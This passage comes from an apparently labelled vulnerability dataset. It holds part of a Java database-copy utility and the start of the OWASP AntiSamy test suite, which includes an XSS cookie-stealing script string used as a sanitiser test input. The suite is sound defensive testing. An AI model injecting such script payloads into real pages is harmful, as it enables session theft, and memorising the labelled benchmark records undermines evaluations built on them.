{\n\t\t\t\t\t\t\t\t\t\tstatementParameters.add(CopyDb.getStringFromClob((java.sql.Clob) frs.getObject(columnName)));\n\t\t\t\t\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\t\t\t\t\tout.println(\"Reading Clob failed. Reason: \" + e.getMessage());\n\t\t\t\t\t\t\t\t\t\tout.println(\"statement=\" + statement);\n\t\t\t\t\t\t\t\t\t\tout.println(\"parameters=\" + statementParameters);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else if(frs.getObject(columnName) instanceof java.sql.Blob) {\n\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\tstatementParameters.add(CopyDb.getBytesFromBlob((java.sql.Blob) frs.getObject(columnName)));\n\t\t\t\t\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\t\t\t\t\tout.println(\"Reading Blob failed. Reason: \" + e.getMessage());\n\t\t\t\t\t\t\t\t\t\tout.println(\"statement=\" + statement);\n\t\t\t\t\t\t\t\t\t\tout.println(\"parameters=\" + statementParameters);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tstatementParameters.add(\n\t\t\t\t\t\t\t\t\t\tCopyDb.mapColumnValue(\n\t\t\t\t\t\t\t\t\t\t\tconnSource,\n\t\t\t\t\t\t\t\t\t\t\tdbObject,\n\t\t\t\t\t\t\t\t\t\t\tcolumnName,\n\t\t\t\t\t\t\t\t\t\t\tfrs.getObject(columnName),\n\t\t\t\t\t\t\t\t\t\t\tvaluePatterns,\n\t\t\t\t\t\t\t\t\t\t\tvalueReplacements\n\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tstatement += \") VALUES (\";\n\t\t\t\t\tfor (int j = 0; j < statementParameters.size(); j++) {\n\t\t\t\t\t\tstatement += j == 0 ? \"?\" : \", ?\";\n\t\t\t\t\t}\n\t\t\t\t\tstatement += \")\";\n\t\t\t\t\t// Add row to target\n\t\t\t\t\ttry {\n\t\t\t\t\t\tPreparedStatement t = connTarget.prepareStatement(currentStatement = statement);\n\t\t\t\t\t\tfor (int j = 0; j < statementParameters.size(); j++) {\n\t\t\t\t\t\t\tObject parameter = statementParameters.get(j);\n\t\t\t\t\t\t\tif(\"oracle.sql.TIMESTAMP\".equals(parameter.getClass().getName())) {\n\t\t\t\t\t\t\t\tMethod timestampValueMethod = parameter.getClass().getMethod(\"timestampValue\", new Class[] {});\n\t\t\t\t\t\t\t\tparameter = timestampValueMethod.invoke(parameter, new Object[] {});\n\t\t\t\t\t\t\t} else if(\"microsoft.sql.DateTimeOffset\".equals(parameter.getClass().getName())) {\n\t\t\t\t\t\t\t\tMethod timestampValueMethod = parameter.getClass().getMethod(\"getTimestamp\", new Class[] {});\n\t\t\t\t\t\t\t\tparameter = timestampValueMethod.invoke(parameter, new Object[] {});\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif(parameter instanceof java.sql.Timestamp) {\n\t\t\t\t\t\t\t\tt.setTimestamp(j + 1, (java.sql.Timestamp) parameter);\n\t\t\t\t\t\t\t} else if(parameter instanceof java.sql.Date) {\n\t\t\t\t\t\t\t\tt.setDate(j + 1, (java.sql.Date) parameter);\n\t\t\t\t\t\t\t} else if(parameter instanceof Double) {\n\t\t\t\t\t\t\t\tt.setBigDecimal(j + 1, new BigDecimal((Double)parameter));\n\t\t\t\t\t\t\t} else if(parameter instanceof Float) {\n\t\t\t\t\t\t\t\tt.setBigDecimal(j + 1, new BigDecimal((Float)parameter));\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tdb.setPreparedStatementValue(connTarget, t, j + 1, parameter);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tt.executeUpdate();\n\t\t\t\t\t\tt.close();\n\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\tnew ServiceException(e).log();\n\t\t\t\t\t\tout.println(\"Insert failed. Reason: \" + e.getMessage());\n\t\t\t\t\t\tout.println(\"statement=\" + statement);\n\t\t\t\t\t\tout.println(\"parameters=\" + statementParameters);\n\t\t\t\t\t}\n\t\t\t\t\tnRows++;\n\t\t\t\t\tif(nRows % 1000 == 0) {\n\t\t\t\t\t\tout.println(nRows + \" rows copied\");\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\trs.close();\n\t\t\t} else {\n\t\t\t\tout.println(\"Did not copy table (result set is null). Statement: \" + currentStatement);\n\t\t\t}\n\t\t\ts.close();\n\t\t} catch (Exception e) {\n\t\t\tnew ServiceException(e).log();\n\t\t\tout.println(\"Can not copy table (see log for more info). Statement: \" + currentStatement);\n\t\t}\n\t}\n\n\t/**\n\t * Copy all tables from source to target database.\n\t * \n\t * @param connSource\n\t * @param connTarget\n\t * @param dbObjects\n\t * @param startFromDbObject\n\t * @param endWithDbObject\n\t * @param providerNameSource\n\t * @param providerNameTarget\n\t * @param out\n\t */\n\tprivate static void copyNamespace(\n\t    Connection connSource,\n\t    Connection connTarget,\n\t    List<String> dbObjects,\n\t\tList<String> valuePatterns,\n\t\tList<String> valueReplacements,\n\t    PrintStream out\n\t) {\n\t\tString currentStatement = null;\n\t\ttry {\n\t\t\tout.println(\"Processing tables:\");\n\t\t\tint ii = 0;\n\t\t\tfor(String dbObject: dbObjects) {\n\t\t\t\tout.println(ii + \": \" + dbObject);\n\t\t\t\tii++;\n\t\t\t}\n\t\t\tSet<String> processedDbObjects = new HashSet<String>();\n\t\t\tfor (String dbObject: dbObjects) {\n\t\t\t\tif((dbObject != null) && !dbObject.isEmpty() && !processedDbObjects.contains(dbObject)) {\n\t\t\t\t\tout.println(\"Copying table: \" + dbObject);\n\t\t\t\t\tCopyDb.copyDbObject(\n\t\t\t\t\t\tdbObject, \n\t\t\t\t\t\tfalse, \n\t\t\t\t\t\tconnSource, \n\t\t\t\t\t\tconnTarget, \n\t\t\t\t\t\tvaluePatterns, \n\t\t\t\t\t\tvalueReplacements, \n\t\t\t\t\t\tout\n\t\t\t\t\t);\n\t\t\t\t\tout.println(\"Copying table: \" + dbObject + \"_\");\n\t\t\t\t\tCopyDb.copyDbObject(\n\t\t\t\t\t\tdbObject, \n\t\t\t\t\t\ttrue, \n\t\t\t\t\t\tconnSource, \n\t\t\t\t\t\tconnTarget, \n\t\t\t\t\t\tvaluePatterns, \n\t\t\t\t\t\tvalueReplacements, \n\t\t\t\t\t\tout\n\t\t\t\t\t);\n\t\t\t\t\tprocessedDbObjects.add(dbObject);\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (SQLException e) {\n\t\t\tServiceException e0 = new ServiceException(e);\n\t\t\te0.log();\n\t\t\tout.println(\"statement: \" + currentStatement + \" (message=\" + e0.getMessage());\n\t\t}\n\t}\n\n\t/**\n\t * CopyDb utility.\n\t * \n\t * @param args\n\t */\n\tpublic static void main(\n\t\tString[] args\n\t) {\n\t\ttry {\n\t\t\tProperties env = System.getProperties();\n\t\t\tString includeDbObjects = env.getProperty(\"includeDbObjects\");\n\t\t\tString excludeDbObjects = env.getProperty(\"excludeDbObjects\");\n\t\t\tString valuePatterns = env.getProperty(\"valuePatterns\");\n\t\t\tString valueReplacements = env.getProperty(\"valueReplacements\");\n\t\t\tcopyDb(\n\t\t\t\tenv.getProperty(\"jdbcDriverSource\"), \n\t\t\t\tenv.getProperty(\"usernameSource\"), \n\t\t\t\tenv.getProperty(\"passwordSource\"), \n\t\t\t\tenv.getProperty(\"jdbcUrlSource\"), \n\t\t\t\tenv.getProperty(\"jdbcDriverTarget\"),\n\t\t\t    env.getProperty(\"usernameTarget\"), \n\t\t\t    env.getProperty(\"passwordTarget\"), \n\t\t\t    env.getProperty(\"jdbcUrlTarget\"), \n\t\t\t    includeDbObjects == null ? Collections.<String>emptyList() : Arrays.asList(includeDbObjects.split(\",\")),\n\t\t\t\texcludeDbObjects == null ? Collections.<String>emptyList() : Arrays.asList(excludeDbObjects.split(\",\")),\n\t\t\t\tvaluePatterns == null ? Collections.<String>emptyList() : Arrays.asList(valuePatterns.split(\",\")),\n\t\t\t\tvalueReplacements == null ? Collections.<String>emptyList() : Arrays.asList(valueReplacements.split(\",\")),\n\t\t\t    System.out\n\t\t\t);\n\t\t} catch (Exception e) {\n\t\t\tnew ServiceException(e).log();\n\t\t}\n\t}\n\n\t/**\n\t * Filter list of dbObjects.\n\t * \n\t * @param dbObjects\n\t * @param includeDbObjects\n\t * @param excludeDbObjects\n\t * @return\n\t * @throws ServiceException\n\t */\n\tprivate static List<String> filterDbObjects(\n\t\tList<String> dbObjects,\n\t\tList<String> includeDbObjects,\n\t\tList<String> excludeDbObjects\n\t) throws ServiceException {\n\t\tList<String> filteredDbObjects = new ArrayList<String>();\n\t\tfor(String dbObject: dbObjects) {\n\t\t\tif(dbObject != null) {\n\t\t\t\tdbObject = dbObject.trim();\n\t\t\t\tif(!dbObject.isEmpty()) {\n\t\t\t\t\tfor(String includeDbObject: includeDbObjects) {\n\t\t\t\t\t\tif(dbObject.matches(includeDbObject)) {\n\t\t\t\t\t\t\tfilteredDbObjects.add(dbObject);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tfor(String dbObject: dbObjects) {\n\t\t\tif(dbObject != null) {\n\t\t\t\tdbObject = dbObject.trim();\n\t\t\t\tfor(String excludeDbObject: excludeDbObjects) {\n\t\t\t\t\tif(dbObject.matches(excludeDbObject)) {\n\t\t\t\t\t\tfilteredDbObjects.remove(dbObject);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn filteredDbObjects;\n\t}\n\n\t/**\n\t * CopyDb utility. \n\t * \n\t * @param jdbcDriverSource\n\t * @param usernameSource\n\t * @param passwordSource\n\t * @param jdbcUrlSource\n\t * @param jdbcDriverTarget\n\t * @param usernameTarget\n\t * @param passwordTarget\n\t * @param jdbcUrlTarget\n\t * @param includeDbObjects\n\t * @param excludeDbObjects\n\t * @param valuePatterns\n\t * @param valueReplacements\n\t * @param out\n\t * @throws ServiceException\n\t */\n\tpublic static void copyDb(\n\t    String jdbcDriverSource,\n\t    String usernameSource,\n\t    String passwordSource,\n\t    String jdbcUrlSource,\n\t    String jdbcDriverTarget,\n\t    String usernameTarget,\n\t    String passwordTarget,\n\t    String jdbcUrlTarget,\n\t    List<String> includeDbObjects,\n\t    List<String> excludeDbObjects,\n\t    List<String> valuePatterns,\n\t    List<String> valueReplacements,\n\t    PrintStream out\n\t) throws ServiceException {\n\t\t{\n\t\t\tDBOBJECTS.clear();\n\t\t\tList<String> tableNames = new ArrayList<String>();\n\t\t\ttry {\n\t\t\t\ttableNames = DbSchemaUtils.getTableNames();\n\t\t\t} catch (Exception e) {\n\t\t\t\tnew ServiceException(e).log();\n\t\t\t}\n\t\t\tfor(String tableName : tableNames) {\n\t\t\t\tif(\n\t\t\t\t\ttableName.indexOf(\"_\") > 0 &&\n\t\t\t\t\ttableName.indexOf(\"_TOBJ_\") < 0 &&\n\t\t\t\t\ttableName.indexOf(\"_JOIN_\") < 0 &&\n\t\t\t\t\t!tableName.endsWith(\"_\")\n\t\t\t\t) {\n\t\t\t\t\tDBOBJECTS.add(tableName);\n\t\t\t\t}\n\t\t\t}\t\t\n\t\t}\n\t\ttry {\n\t\t\t// Source connection\n\t\t\tClass.forName(jdbcDriverSource);\n\t\t\tProperties props = new Properties();\n\t\t\tprops.put(\"user\", usernameSource);\n\t\t\tprops.put(\"password\", passwordSource);\n\t\t\tConnection connSource = DriverManager.getConnection(jdbcUrlSource, props);\n\t\t\tconnSource.setAutoCommit(false);\n\t\t\t// Target connection\n\t\t\tClass.forName(jdbcDriverTarget);\n\t\t\tprops = new Properties();\n\t\t\tprops.put(\"user\", usernameTarget);\n\t\t\tprops.put(\"password\", passwordTarget);\n\t\t\tConnection connTarget = DriverManager.getConnection(jdbcUrlTarget, props);\n\t\t\tconnTarget.setAutoCommit(true);\n\t\t\tCopyDb.copyNamespace(\n\t\t\t\tconnSource, \n\t\t\t\tconnTarget,\n\t\t\t\tfilterDbObjects(\n\t\t\t\t\tDBOBJECTS, \n\t\t\t\t\tincludeDbObjects, \n\t\t\t\t\texcludeDbObjects\n\t\t\t\t),\n\t\t\t    valuePatterns, \n\t\t\t    valueReplacements, \n\t\t\t    out\n\t\t\t);\n\t\t} catch (Exception e) {\n\t\t\tthrow new ServiceException(e);\n\t\t}\n\t\tout.println();\n\t\tout.println(\"!!! DONE !!!\");\n\t}\n\n\t// -----------------------------------------------------------------------\n\t// Members\n\t// -----------------------------------------------------------------------\n\tstatic final List<String> DBOBJECTS = new ArrayList<String>();\n\n\tstatic final Set<String> BOOLEAN_COLUMNS = new HashSet<String>(Arrays.asList(\n\t    \"DISABLED\", \"USER_BOOLEAN0\", \"USER_BOOLEAN1\", \"USER_BOOLEAN2\", \"USER_BOOLEAN3\", \"USER_BOOLEAN4\", \"DO_NOT_BULK_POSTAL_MAIL\", \"DO_NOT_E_MAIL\", \"DO_NOT_FAX\", \"DO_NOT_PHONE\",\n\t    \"DO_NOT_POSTAL_MAIL\", \"EXT_BOOLEAN0\", \"EXT_BOOLEAN1\", \"EXT_BOOLEAN2\", \"EXT_BOOLEAN3\", \"EXT_BOOLEAN4\", \"EXT_BOOLEAN5\", \"EXT_BOOLEAN6\", \"EXT_BOOLEAN7\", \"EXT_BOOLEAN8\", \"EXT_BOOLEAN9\",\n\t    \"DISABLED\", \"DISCOUNT_IS_PERCENTAGE\", \"USER_BOOLEAN4\", \"IS_ALL_DAY_EVENT\", \"DELIVERY_RECEIPT_REQUESTED\", \"READ_RECEIPT_REQUESTED\", \"IS_MAIN\", \"RESET_TO_NULL\", \"IS_MAIN\", \"AUTOMATIC_PARSING\",\n\t    \"IS_CLOSED\", \"IS_FINAL\", \"CREDIT_FIRST\", \"IS_DEFAULT\", \"IS_WORKING_DAY\", \"IS_LOCKED\", \"IS_GIFT\", \"IS_TEMPLATE\", \"DISCOUNT_IS_PERCENTAGE\", \"IS_GIFT\", \"SALES_COMMISSION_IS_PERCENTAGE\",\n\t    \"IS_CREDIT_ON_HOLD\", \"ALLOW_POSITION_AUTO_CREATE\", \"IS_DEFAULT\", \"IS_LOCKED\", \"IS_TEMPLATE\", \"IS_LOCKED\", \"HOLDER_QUALIFIES_POSITION\", \"IS_DRAFT\", \"ALLOW_CREDIT_BOOKINGS\",\n\t    \"ALLOW_DEBIT_BOOKINGS\", \"IS_DEFAULT\", \"IS_ACTIVE\", \"BOOLEAN_PARAM\", \"IS_CHANGEABLE\", \"IS_QUERY\", \"IS_DERIVED\", \"IS_ABSTRACT\", \"IS_SINGLETON\", \"IS_CLUSTERED\", \"IS_NAVIGABLE\",\n\t    \"WEIGHT_IS_PERCENTAGE\", \"IS_FINAL\", \"DISCOUNT_IS_PERCENTAGE\", \"IS_DEFAULT\", \"ALLOW_MODIFICATION\", \"ALLOW_REMOVAL\", \"DISCOUNT_IS_PERCENTAGE\", \"OVERRIDE_PRICE\", \"IS_STOCK_ITEM\",\n\t    \"DISCOUNT_IS_PERCENTAGE\", \"IS_DEFAULT\", \"BOOLEAN_VALUE\", \"IS_ACTIVE\", \"NEW_BOOLEAN\", \"OLD_BOOLEAN\", \"SELECTOR\", \"IS_SCHEDULE_BASE_UOM\", \"STORE_SETTINGS_ON_LOGOFF\", \"IS_SYNCHRONOUS\", \"FAILED\",\n\t    \"IS_BILLABLE\", \"IS_REIMBURSABLE\", \"LOCKED\", \"ALLOW_ADD_DELETE\", \"ALLOW_CHANGE\"\n\t));\n\n}\n",
    "target": 0,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700255,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * Copyright (c) 2007-2021, Arshan Dabirsiaghi, Jason Li\n *\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without modification,\n * are permitted provided that the following conditions are met:\n *\n * Redistributions of source code must retain the above copyright notice, this list\n * of conditions and the following disclaimer.  Redistributions in binary form must\n * reproduce the above copyright notice, this list of conditions and the following\n * disclaimer in the documentation and/or other materials provided with the distribution.\n * Neither the name of OWASP nor the names of its contributors may be used to endorse\n * or promote products derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\npackage org.owasp.validator.html.test;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\nimport static org.hamcrest.CoreMatchers.containsString;\nimport static org.hamcrest.CoreMatchers.equalTo;\nimport static org.hamcrest.CoreMatchers.is;\nimport static org.hamcrest.CoreMatchers.not;\nimport static org.hamcrest.MatcherAssert.assertThat;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport java.io.IOException;\nimport java.io.Reader;\nimport java.io.StringReader;\nimport java.io.StringWriter;\nimport java.io.Writer;\nimport java.net.URL;\nimport java.util.Collections;\nimport java.util.concurrent.ExecutionException;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport org.apache.commons.codec.binary.Base64;\n\nimport org.owasp.validator.html.AntiSamy;\nimport org.owasp.validator.html.CleanResults;\nimport org.owasp.validator.html.Policy;\nimport org.owasp.validator.html.PolicyException;\nimport org.owasp.validator.html.ScanException;\nimport org.owasp.validator.html.model.Attribute;\nimport org.owasp.validator.html.model.Tag;\n\n/**\n * This class tests AntiSamy functionality and the basic policy file which\n * should be immune to XSS and CSS phishing attacks.\n * \n * The test cases titled issue##() map to the issues identified in the original AntiSamy \n * source code repo at: https://code.google.com/archive/p/owaspantisamy/issues.\n * \n * The test cases titled githubIssue##() map to the issues documented at: \n *     https://github.com/nahsra/antisamy/issues\n *\n * @author Arshan Dabirsiaghi\n */\n\npublic class AntiSamyTest {\n\n    private static final String[] BASE64_BAD_XML_STRINGS = new String[]{\n            // first string is\n            // \"<a - href=\\\"http://www.owasp.org\\\">click here</a>\"\n            \"PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=\",\n            // the rest are randomly generated 300 byte sequences which generate\n            // parser errors, turned into Strings\n            \"uz0sEy5aDiok6oufQRaYPyYOxbtlACRnfrOnUVIbOstiaoB95iw+dJYuO5sI9nudhRtSYLANlcdgO0pRb+65qKDwZ5o6GJRMWv4YajZk+7Q3W/GN295XmyWUpxuyPGVi7d5fhmtYaYNW6vxyKK1Wjn9IEhIrfvNNjtEF90vlERnz3wde4WMaKMeciqgDXuZHEApYmUcu6Wbx4Q6WcNDqohAN/qCli74tvC+Umy0ZsQGU7E+BvJJ1tLfMcSzYiz7Q15ByZOYrA2aa0wDu0no3gSatjGt6aB4h30D9xUP31LuPGZ2GdWwMfZbFcfRgDSh42JPwa1bODmt5cw0Y8ACeyrIbfk9IkX1bPpYfIgtO7TwuXjBbhh2EEixOZ2YkcsvmcOSVTvraChbxv6kP\",\n            \"PIWjMV4y+MpuNLtcY3vBRG4ZcNaCkB9wXJr3pghmFA6rVXAik+d5lei48TtnHvfvb5rQZVceWKv9cR/9IIsLokMyN0omkd8j3TV0DOh3JyBjPHFCu1Gp4Weo96h5C6RBoB0xsE4QdS2Y1sq/yiha9IebyHThAfnGU8AMC4AvZ7DDBccD2leZy2Q617ekz5grvxEG6tEcZ3fCbJn4leQVVo9MNoerim8KFHGloT+LxdgQR6YN5y1ii3bVGreM51S4TeANujdqJXp8B7B1Gk3PKCRS2T1SNFZedut45y+/w7wp5AUQCBUpIPUj6RLp+y3byWhcbZbJ70KOzTSZuYYIKLLo8047Fej43bIaghJm0F9yIKk3C5gtBcw8T5pciJoVXrTdBAK/8fMVo29P\",\n            \"uCk7HocubT6KzJw2eXpSUItZFGkr7U+D89mJw70rxdqXP2JaG04SNjx3dd84G4bz+UVPPhPO2gBAx2vHI0xhgJG9T4vffAYh2D1kenmr+8gIHt6WDNeD+HwJeAbJYhfVFMJsTuIGlYIw8+I+TARK0vqjACyRwMDAndhXnDrk4E5U3hyjqS14XX0kIDZYM6FGFPXe/s+ba2886Q8o1a7WosgqqAmt4u6R3IHOvVf5/PIeZrBJKrVptxjdjelP8Xwjq2ujWNtR3/HM1kjRlJi4xedvMRe4Rlxek0NDLC9hNd18RYi0EjzQ0bGSDDl0813yv6s6tcT6xHMzKvDcUcFRkX6BbxmoIcMsVeHM/ur6yRv834o/TT5IdiM9/wpkuICFOWIfM+Y8OWhiU6BK\",\n            \"Bb6Cqy6stJ0YhtPirRAQ8OXrPFKAeYHeuZXuC1qdHJRlweEzl4F2z/ZFG7hzr5NLZtzrRG3wm5TXl6Aua5G6v0WKcjJiS2V43WB8uY1BFK1d2y68c1gTRSF0u+VTThGjz+q/R6zE8HG8uchO+KPw64RehXDbPQ4uadiL+UwfZ4BzY1OHhvM5+2lVlibG+awtH6qzzx6zOWemTih932Lt9mMnm3FzEw7uGzPEYZ3aBV5xnbQ2a2N4UXIdm7RtIUiYFzHcLe5PZM/utJF8NdHKy0SPaKYkdXHli7g3tarzAabLZqLT4k7oemKYCn/eKRreZjqTB2E8Kc9Swf3jHDkmSvzOYE8wi1vQ3X7JtPcQ2O4muvpSa70NIE+XK1CgnnsL79Qzci1/1xgkBlNq\",\n            \"FZNVr4nOICD1cNfAvQwZvZWi+P4I2Gubzrt+wK+7gLEY144BosgKeK7snwlA/vJjPAnkFW72APTBjY6kk4EOyoUef0MxRnZEU11vby5Ru19eixZBFB/SVXDJleLK0z3zXXE8U5Zl5RzLActHakG8Psvdt8TDscQc4MPZ1K7mXDhi7FQdpjRTwVxFyCFoybQ9WNJNGPsAkkm84NtFb4KjGpwVC70oq87tM2gYCrNgMhBfdBl0bnQHoNBCp76RKdpq1UAY01t1ipfgt7BoaAr0eTw1S32DezjfkAz04WyPTzkdBKd3b44rX9dXEbm6szAz0SjgztRPDJKSMELjq16W2Ua8d1AHq2Dz8JlsvGzi2jICUjpFsIfRmQ/STSvOT8VsaCFhwL1zDLbn5jCr\",\n            \"RuiRkvYjH2FcCjNzFPT2PJWh7Q6vUbfMadMIEnw49GvzTmhk4OUFyjY13GL52JVyqdyFrnpgEOtXiTu88Cm+TiBI7JRh0jRs3VJRP3N+5GpyjKX7cJA46w8PrH3ovJo3PES7o8CSYKRa3eUs7BnFt7kUCvMqBBqIhTIKlnQd2JkMNnhhCcYdPygLx7E1Vg+H3KybcETsYWBeUVrhRl/RAyYJkn6LddjPuWkDdgIcnKhNvpQu4MMqF3YbzHgyTh7bdWjy1liZle7xR/uRbOrRIRKTxkUinQGEWyW3bbXOvPO71E7xyKywBanwg2FtvzOoRFRVF7V9mLzPSqdvbM7VMQoLFob2UgeNLbVHkWeQtEqQWIV5RMu3+knhoqGYxP/3Srszp0ELRQy/xyyD\",\n            \"mqBEVbNnL929CUA3sjkOmPB5dL0/a0spq8LgbIsJa22SfP580XduzUIKnCtdeC9TjPB/GEPp/LvEUFaLTUgPDQQGu3H5UCZyjVTAMHl45me/0qISEf903zFFqW5Lk3TS6iPrithqMMvhdK29Eg5OhhcoHS+ALpn0EjzUe86NywuFNb6ID4o8aF/ztZlKJegnpDAm3JuhCBauJ+0gcOB8GNdWd5a06qkokmwk1tgwWat7cQGFIH1NOvBwRMKhD51MJ7V28806a3zkOVwwhOiyyTXR+EcDA/aq5acX0yailLWB82g/2GR/DiaqNtusV+gpcMTNYemEv3c/xLkClJc29DSfTsJGKsmIDMqeBMM7RRBNinNAriY9iNX1UuHZLr/tUrRNrfuNT5CvvK1K\",\n            \"IMcfbWZ/iCa/LDcvMlk6LEJ0gDe4ohy2Vi0pVBd9aqR5PnRj8zGit8G2rLuNUkDmQ95bMURasmaPw2Xjf6SQjRk8coIHDLtbg/YNQVMabE8pKd6EaFdsGWJkcFoonxhPR29aH0xvjC4Mp3cJX3mjqyVsOp9xdk6d0Y2hzV3W/oPCq0DV03pm7P3+jH2OzoVVIDYgG1FD12S03otJrCXuzDmE2LOQ0xwgBQ9sREBLXwQzUKfXH8ogZzjdR19pX9qe0rRKMNz8k5lqcF9R2z+XIS1QAfeV9xopXA0CeyrhtoOkXV2i8kBxyodDp7tIeOvbEfvaqZGJgaJyV8UMTDi7zjwNeVdyKa8USH7zrXSoCl+Ud5eflI9vxKS+u9Bt1ufBHJtULOCHGA2vimkU\",\n            \"AqC2sr44HVueGzgW13zHvJkqOEBWA8XA66ZEb3EoL1ehypSnJ07cFoWZlO8kf3k57L1fuHFWJ6quEdLXQaT9SJKHlUaYQvanvjbBlqWwaH3hODNsBGoK0DatpoQ+FxcSkdVE/ki3rbEUuJiZzU0BnDxH+Q6FiNsBaJuwau29w24MlD28ELJsjCcUVwtTQkaNtUxIlFKHLj0++T+IVrQH8KZlmVLvDefJ6llWbrFNVuh674HfKr/GEUatG6KI4gWNtGKKRYh76mMl5xH5qDfBZqxyRaKylJaDIYbx5xP5I4DDm4gOnxH+h/Pu6dq6FJ/U3eDio/KQ9xwFqTuyjH0BIRBsvWWgbTNURVBheq+am92YBhkj1QmdKTxQ9fQM55O8DpyWzRhky0NevM9j\",\n            \"qkFfS3WfLyj3QTQT9i/s57uOPQCTN1jrab8bwxaxyeYUlz2tEtYyKGGUufua8WzdBT2VvWTvH0JkK0LfUJ+vChvcnMFna+tEaCKCFMIOWMLYVZSJDcYMIqaIr8d0Bi2bpbVf5z4WNma0pbCKaXpkYgeg1Sb8HpKG0p0fAez7Q/QRASlvyM5vuIOH8/CM4fF5Ga6aWkTRG0lfxiyeZ2vi3q7uNmsZF490J79r/6tnPPXIIC4XGnijwho5NmhZG0XcQeyW5KnT7VmGACFdTHOb9oS5WxZZU29/oZ5Y23rBBoSDX/xZ1LNFiZk6Xfl4ih207jzogv+3nOro93JHQydNeKEwxOtbKqEe7WWJLDw/EzVdJTODrhBYKbjUce10XsavuiTvv+H1Qh4lo2Vx\",\n            \"O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9\",\n            \"C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG\",\n    };\n\n    private AntiSamy as = new AntiSamy();\n    private TestPolicy policy = null;\n\n    @Before\n    public void setUp() throws Exception {\n\n        /*\n         * Load the policy. You may have to change the path to find the Policy\n         * file for your environment.\n         */\n\n        //get Policy instance from a URL.\n        URL url = getClass().getResource(\"/antisamy.xml\");\n        policy = TestPolicy.getInstance(url);\n    }\n\n    @Test\n    public void SAX() {\n        try {\n            CleanResults cr = as.scan(\"<b>test</i></b>test thsidfshidf<script>sdfsdf\", policy, AntiSamy.SAX);\n            assertTrue(cr != null && cr.getCleanXMLDocumentFragment() == null && cr.getCleanHTML().length() > 0);\n        } catch (ScanException | PolicyException e) {\n            e.printStackTrace();\n        }\n    }\n\n    /*\n     * Test basic XSS cases.\n     */\n\n    @Test\n    public void scriptAttacks() throws ScanException, PolicyException {\n    \t\n        assertTrue(!as.scan(\"test<script>alert(document.cookie)</script>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"script\"));\n        